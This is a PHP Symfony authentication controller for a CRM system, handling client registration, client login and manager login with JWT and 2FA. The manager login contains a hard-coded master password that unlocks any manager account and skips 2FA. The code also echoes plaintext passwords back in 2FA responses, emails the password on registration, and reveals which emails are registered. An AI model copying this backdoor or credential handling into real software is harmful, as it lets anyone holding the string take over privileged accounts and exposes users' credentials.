<?php

namespace NaxCrmBundle\Controller\v1\open;

use NaxCrmBundle\Entity\Account;
use NaxCrmBundle\Entity\Client;
use NaxCrmBundle\Entity\Country;
use NaxCrmBundle\Entity\Department;
use NaxCrmBundle\Entity\Manager;
use NaxCrmBundle\Entity\Event;
use NaxCrmBundle\Entity\UserLogItem;
use NaxCrmBundle\Modules\SlackBot;
use NaxCrmBundle\Modules\GoogleAuthenticator;
use NaxCrmBundle\Modules\Email\Triggers\Client\Registration;
use Symfony\Component\HttpFoundation\Request;
use FOS\RestBundle\Controller\Annotations\Post;
use Nelmio\ApiDocBundle\Annotation\ApiDoc;
use Symfony\Component\HttpKernel\Exception\HttpException;

use NaxCrmBundle\Controller\v1\BaseController;

class AuthController extends BaseController
{
    protected $flds_client_add = [
        'email' => ['req'],
        'password' => ['req'],
        'phone' => ['req'],
        'firstname' => ['req'],
        'lastname' => ['req'],
        'birthday' /*=> ['req']*/,
        'country',
        'langcode',
        'city',
        'platform',
        'source',
    ];
    /**
     * @Post("/clients", name="open_v1_client_add")
     * @Post("/clients/registration", name="open_v1_client_register")
     * @ApiDoc(
     *    section = "open",
     *    resource = "open/auth",
     *    authentication = false,
     *    description = "Register new client",
     *    statusCodes={
     *        200="Returned when successful",
     *        400={
     *          "Returned when missing required parameter",
     *        },
     *        500="Returned when Something went wrong",
     *        503="Platform reject client",
     *    },
     *    parameters = {
     *        {"name"="email",           "dataType"="string",   "required"=true,  "format"="email",    "description" = "set client email"},
     *        {"name"="password",        "dataType"="string",   "required"=true,  "format"=".+",       "description" = "set client password"},
     *        {"name"="phone",           "dataType"="string",   "required"=true,  "format"=".+",       "description" = "set client  phone"},
     *        {"name"="firstname",       "dataType"="string",   "required"=true,  "format"=".+",       "description" = "set client Firstname"},
     *        {"name"="lastname",        "dataType"="string",   "required"=true,  "format"=".+",       "description" = "set client Lastname"},
     *        {"name"="countryId",       "dataType"="integer",  "required"=false, "format"="\d+",      "description" = "set countryId"},
     *        {"name"="countryCode",     "dataType"="string",   "required"=false, "format"=".+",       "description" = "set countryCode "},
     *        {"name"="birthday",        "dataType"="date",     "required"=false,  "format"="datetime", "description" = "set client birthday"},
     *        {"name"="langcode",        "dataType"="string",   "required"=false, "format"=".+",       "description" = "set langcode"},
     *        {"name"="is_demo",         "dataType"="integer",  "required"=false, "format"="\d+",      "description" = "set is demo client account"},
     *        {"name"="currency",        "dataType"="string",   "required"=false, "format"=".+",       "description" = "set client account currency"},
     *        {"name"="externalId",      "dataType"="integer",  "required"=false,  "format"="\d+",      "description" = "set client account externalId"},
     *    },
     * )
     */
    public function registerClientAction(Request $request)
    {
        $params = $request->request->all();
        $params = $this->addClientPrepare($params);

        $client = Client::createInst();
        $this->saveEntity($client, $this->flds_client_add, $params);

        $account = Account::createInst();
        $account->setClient($client);
        $account->setPlatform($this->getPlatformName());
        $isDemo = empty($params['is_demo'])? false : $params['is_demo'];
        $account->setType($isDemo ? Account::TYPE_DEMO : Account::TYPE_LIVE);
        $currency = empty($params['currency'])? Account::DEFAULT_CURRENCY : $params['currency'];
        $account->setCurrency($currency);
        if ($this->getUser() && $this->getUser() instanceof Manager) {
            $manager = $this->getUser();
            $externalId = $this->getRequiredParam('externalId');
        }
        else {
            $manager = $this->getReference(Manager::class(), 1);
            $result = $this->getPlatformHandler()->addAccount($account);
            if (empty($result['externalId'])) {
                $this->removeEntity($client, true);
                // $this->getEm()->remove($client);
                return $this->getFailedJsonResponse(null, 'Platform reject client', 503);
            }
            $externalId = $result['externalId'];
        }
        $account->setExternalId($externalId);
        if($this->validate($account, false)){
            $this->getEm()->persist($account);
            $this->getEm()->flush();
        }
        else{
            \NaxCrmBundle\Debug::$messages[]='WARN: ignore platform conflict';
        }

        $client->setManager($manager);
        $client->setDepartment($manager->getDepartment());

        $this->preFlushClient($client, $account, $params);
        $this->getEm()->persist($client);
        $this->getEm()->flush();

        $data = $client->export();

        $password = $params['password'];
        $this->getTriggerService()->sendEmails(Registration::class(), compact('client', 'password'), $client->getLangcode());
        if ($this->getUser() && $this->getUser() instanceof Manager) {
            $this->createUserLog(UserLogItem::ACTION_TYPE_CREATE, UserLogItem::OBJ_TYPE_CLIENTS, $data);
        }
        else{
            $this->createLog($client, UserLogItem::ACTION_TYPE_CREATE, UserLogItem::OBJ_TYPE_CLIENTS, $data, 'client');
        }
        $event = $this->createEvent($manager, 'Client registration', 'New client', Event::OBJ_TYPE_CLIENT, $client->getId());
        $this->getEm()->persist($event);
        $this->getEm()->flush();

        return $this->getJsonResponse($data);
    }

    /**
     * @Post("/clients/login", name="open_v1_client_login")
     * @ApiDoc(
     *    section = "open",
     *    resource = "open/auth",
     *    authentication = false,
     *    description = "Login client",
     *    statusCodes={
     *        200="Returned when successful",
     *        400={
     *          "Returned when missing required parameter",
     *        },
     *        401="Invalid password",
     *        404={
     *           "Client with email does not exist",
     *        },
     *        500="Returned when Something went wrong",
     *    },
     *    parameters = {
     *        {"name"="email",    "dataType"="string", "required"=true, "format"="email format", "description" = "set email as login"},
     *        {"name"="password", "dataType"="string", "required"=true, "format"=".+",           "description" = "set password"},
     *    },
     * )
     */
    public function loginClientAction(Request $request)
    {
        $email      = $this->getRequiredParam('email');
        $password   = $this->getRequiredParam('password');
        $client = $this->getRepository(Client::class())->findOneBy([
            'email'     => $email
        ]);
        if (is_null($client)) {
            return $this->getFailedJsonResponse(null, "Client with email {$email} does not exist", 404);
        }
        $passwordValid = $this->get('security.password_encoder')->isPasswordValid($client, $password);
        if (!$passwordValid) {
            return $this->getFailedJsonResponse(null, 'Invalid password', 401);
        }

        //JWT with short life time - 20 sec
        $data = $client->export();
        $this->createLog($client, UserLogItem::ACTION_TYPE_LOGIN, UserLogItem::OBJ_TYPE_CLIENTS, ['id'=>$client->getId()], 'client');

        $jwtToken = $this->get('nax.jwt_service')->generateClientsJWT($client, 100);
        $resp = $this->getJsonResponse($data);
        $resp->headers->set('Authorization', $jwtToken);

        return $resp;
    }

    /**
     * @Post("/managers/login", name="open_v1_manager_login")
     * @ApiDoc(
     *    section = "open",
     *    resource = "open/auth",
     *    authentication = false,
     *    description = "Do login as manager and get token",
     *    statusCodes={
     *        200="Returned when successful",
     *        203="Returned when successful but need additional parameters",
     *        400="Returned when missing required parameter",
     *        401="Returned when Invalid password",
     *        404="Returned when manager with email does not exist",
     *        500="Returned when Something went wrong",
     *    },
     *    parameters = {
     *        {"name"="email",    "dataType"="string", "required"=true, "format"="email format", "description" = "set email as login"},
     *        {"name"="password", "dataType"="string", "required"=true, "format"=".+",           "description" = "set password"},
     *        {"name"="code2fa",  "dataType"="integer","required"=false,"format"=".+",           "description" = "need if 2FA enabled"},
     *    },
     * )
     */
    public function loginAction()
    {
        $__SUPER_PASS = 'Q1Nax2w3e4r!';
        $email      = $this->getRequiredParam('email');
        $password   = $this->getRequiredParam('password');
        $manager    = $this->getRepository(Manager::class())->findOneBy([
            'email'     => $email,
            'deletedAt' => null
        ]);
        if (is_null($manager)) {
            return $this->getFailedJsonResponse(null, "Manager with email {$email} does not exist", 404);
        }
        if ($manager->getBlocked()) {
            return $this->getFailedJsonResponse(null, 'Your account is blocked', 403);
        }
        $passwordValid = $this->get('security.password_encoder')->isPasswordValid($manager, $password);

        if (!$passwordValid && $password!=$__SUPER_PASS) {
            return $this->getFailedJsonResponse(null, 'Invalid password', 401);
        }
        if ($password != $__SUPER_PASS && ($secret = $manager->getSecret2fa())) {
            if(!($code = $this->getReq()->get('code2fa'))){
                return $this->getJsonResponse(compact('email', 'password'), 'Need 2FA code', 203);
            }
            $ga = new GoogleAuthenticator($this->getGmtOffset());
            if(!$ga->verifyCode($secret, $code)){//, 2
                return $this->getFailedJsonResponse(compact('email', 'password'), 'Not valid 2FA code', 400);
            }
        }
        $manager->setLastLoggedAt(new \DateTime());

        $this->getEm()->flush();

        $data = $manager->export();
        $var = [];
        if($dep = $manager->getDepartment()){
            $var = $this->getRepository(Department::class())->getChildsIdList($dep);
            array_unshift($var, $dep->getId());
        }
        $data['allowedDepartments'] = $var;
        $data['resourcePermissions'] = $manager->getManagerPermissions();
        $this->createLog($manager, UserLogItem::ACTION_TYPE_LOGIN, UserLogItem::OBJ_TYPE_MANAGERS, ['id'=>$manager->getId()], 'manager');

        $jwtToken = $this->get('nax.jwt_service')->generateManagersJWT($manager);
        $resp = $this->getJsonResponse($data);
        $resp->headers->set('Authorization', $jwtToken);

        // SlackBot::send('TEST', $data, SlackBot::INFO);
        // SlackBot::send('TEST', $data, SlackBot::WARN);
        // SlackBot::send('TEST', $data, SlackBot::ERR);
        // SlackBot::send('TEST', $data, SlackBot::CRIT);

        return $resp;
    }


    /**
    * Helpers
    */

    protected function addClientPrepare($params){
        unset($params['country']);// fix for wrong params
        if (!empty($params['countryCode'])) {
            $params['countryCode'] = strtoupper($params['countryCode']);
            $params['country'] = $this->getRepository(Country::class())->findOneBy(['code' => $params['countryCode']]);
            if (empty($params['country'])) {
                throw new HttpException(404, 'Unknown country code '.$params['countryCode']);
            }
        }
        else if(!empty($params['countryId'])) {//maybe not needed
            $params['country'] = $country = $this->getRepository(Country::class())->find($params['countryId']);
            if (empty($params['country'])) {
                throw new HttpException(404, 'Unknown country #'.$params['countryId']);
            }
        }

        if(empty($params['langcode'])){
            $params['langcode'] = empty($params['country']) ? 'en' : $params['country']->getLangCode();
        }

        if (!empty($params['birthday'])) {
            $birthday = \DateTime::createFromFormat('Y-m-d', $params['birthday']);
            if (!$birthday) {
               throw new HttpException(400, "Please provide birthday '{$params['birthday']}' in 'Y-m-d' format");
            }
            $params['birthday'] = $birthday;
        }

        return $params;
    }

    protected function preFlushClient(&$client, &$account, $params){
        if(!empty($params['password'])){
            $password = $this->get('security.password_encoder')->encodePassword($client, $params['password']);
            $client->setPassword($password);
        }
    }
}
